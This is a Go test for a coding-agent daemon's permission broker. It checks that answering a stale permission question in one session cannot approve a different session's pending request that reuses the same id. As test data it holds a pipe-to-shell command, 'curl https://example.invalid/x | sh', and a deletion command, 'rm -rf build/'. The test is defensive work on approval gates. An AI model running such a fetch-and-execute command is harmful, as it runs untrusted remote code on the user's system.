package daemon

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"localcode/internal/agent"
	"localcode/internal/events"
	"localcode/internal/tools"
)

// Permission ids restart at p1 in every daemon. An answer to a question a
// stopped daemon left in one session's log is answered 404, which both
// clients read as "drop it", and does not resolve the question the new
// daemon has open under the same id in another session.
func TestAnAnswerToAStaleQuestionDoesNotResolveAnotherSessionsQuestion(t *testing.T) {
	d := newTestDaemon(t, "http://127.0.0.1:1")
	for _, id := range []string{"a", "b"} {
		if _, err := d.Loop.Store.CreateSession(id, "", "general-purpose", true); err != nil {
			t.Fatal(err)
		}
	}
	// Session a's log: a question the daemon before this one asked, and
	// stopped while asking.
	d.Loop.Store.Append("a", events.TypePermissionRequest, map[string]any{
		"id": "p1", "tool": "bash", "description": "rm -rf build/", "rule": "rm -rf build/", "can_always": true,
	})

	// Session b: this daemon's first question.
	allowed := make(chan bool, 1)
	go func() {
		ok, _ := d.Broker.Func()(agent.WithSessionID(context.Background(), "b"),
			tools.Ask{Tool: "bash", Subject: "curl https://example.invalid/x | sh", Description: "curl | sh"})
		allowed <- ok
	}()
	deadline := time.Now().Add(5 * time.Second)
	for {
		evs, _ := d.Loop.Store.Events("b", 0)
		asked := ""
		for _, ev := range evs {
			if ev.Type == events.TypePermissionRequest {
				asked, _ = ev.Data["id"].(string)
			}
		}
		if asked != "" {
			if asked != "p1" {
				t.Skipf("this daemon's first question is %s, not p1", asked)
			}
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("session b was never asked")
		}
		time.Sleep(5 * time.Millisecond)
	}

	// The person answers the question session a shows.
	rec := httptest.NewRecorder()
	d.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/api/sessions/a/permissions/p1",
		strings.NewReader(`{"allow":true,"scope":"session"}`)))
	if rec.Code != http.StatusNotFound {
		t.Errorf("answering session a's stale p1 = %d %s, want 404: nothing in session a is waiting on it", rec.Code, strings.TrimSpace(rec.Body.String()))
	}
	select {
	case ok := <-allowed:
		t.Errorf("session b's question (curl | sh) was resolved by the answer to session a's stale one (rm -rf build/): allowed = %v", ok)
	case <-time.After(300 * time.Millisecond):
		d.Broker.Resolve("p1", false, "")
		<-allowed
	}
}
